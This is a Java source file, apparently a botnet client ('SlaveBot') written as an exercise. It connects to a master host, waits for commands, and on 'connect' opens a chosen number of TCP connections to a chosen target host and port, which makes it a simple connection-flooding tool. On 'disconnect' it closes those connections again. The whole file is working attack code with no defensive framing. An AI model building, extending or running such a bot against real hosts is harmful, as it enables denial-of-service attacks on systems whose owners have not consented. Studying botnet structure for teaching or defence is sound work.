import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.PrintWriter;
import java.net.Socket;
import java.util.*;
import java.text.*;


class slaveSocketDetails{
Socket 	targetSocket;
String 	regDate;
String 	targetHostIP;
String 	targetAddressName;
int	    targetPortNumber;

 slaveSocketDetails() {
	Date currDate = new Date();
	regDate= new SimpleDateFormat("yyyy-MM-dd").format(currDate);
  }
}

public class SlaveBot {
    public static ArrayList<slaveSocketDetails> slaveconnList=new ArrayList<slaveSocketDetails>();
    public static Socket slaveSocket;
    public static void main(String[] args) throws Exception {
        if (args.length<4){
            System.out.println("Error in the arguments provided");
            System.exit(-1);	
        }
        String hostname = "";
        String portno = "";
        if (args[0].equals("-h") && args[2].equals("-p")){ 
            hostname=args[1];
            portno=args[3];
        }
        else if (args[0].equals("-p") && args[2].equals("-h")){ 
            hostname=args[3];
            portno=args[1];
        }
        else{
            System.out.println("Hostname and Port number should be provided with args -h and -p respectively");
            System.exit(-1);
        }
        try{
            Integer.parseInt(portno);
        }
        catch (Exception e){
           System.out.println("Port number provided is Invalid");
           System.exit(-1);
        }
        slaveSocket = new Socket(hostname, Integer.parseInt(portno));
        BufferedReader netIn = new BufferedReader(new InputStreamReader(slaveSocket.getInputStream()));
        slaveSocketDetails slaveTargetList;
        while (true) {
            try{
                String commandFromServer = netIn.readLine();
                if (commandFromServer !="") {
                    String[] serverCommand = commandFromServer.split(" ");
                    if(serverCommand[0].equals("connect")){
                        if(serverCommand[1] != null && serverCommand[2]!= null && serverCommand[3]!= null){    	
                            String targethostname = serverCommand[1];
                            int targetport = Integer.parseInt(serverCommand[2].toString());
                            int noofconn = Integer.parseInt(serverCommand[3].toString());
                            Socket slavetargetSocket;
                            for (int i=0; i< noofconn; i++){
                                try{	
                                    slavetargetSocket = new Socket(targethostname, targetport);
                                    slaveTargetList=new slaveSocketDetails();
                                    slaveTargetList.targetHostIP=slavetargetSocket.getInetAddress().getHostAddress();
                                    slaveTargetList.targetAddressName=slavetargetSocket.getInetAddress().getHostName();
                                    slaveTargetList.targetPortNumber=targetport;
                                    slaveTargetList.targetSocket=slavetargetSocket;
                                    slaveconnList.add(slaveTargetList);
                                } 
                                catch (Exception e) {
                                    System.out.println(" could not open connection for  " + targethostname+" " + targetport);
                                }
                            }
                        }
                        else{
                         System.out.println("proper arguments required for connect");
                        }
                    }
                    else if (serverCommand[0].equals("disconnect")){
                        String targetname = serverCommand[1];
                        int targetportno =Integer.parseInt(serverCommand[2].toString());
                        Iterator<slaveSocketDetails> i = slaveconnList.iterator();
                        while (i.hasNext()) {
                            slaveSocketDetails delSocket =i.next();
                            if(delSocket.targetHostIP.equals(targetname) || delSocket.targetAddressName.equals(targetname)){
                                if(targetportno==0 || delSocket.targetPortNumber==targetportno ){
                                    delSocket.targetSocket.close();
                                    i.remove();
                                }
                            }
                        }
                    }
                }
                else{
                 System.out.println(" not a proper command " +  commandFromServer);
                }
            }
            catch (Exception e) {
                e.printStackTrace();
                System.exit(-1);	   
            }
        }
    }
}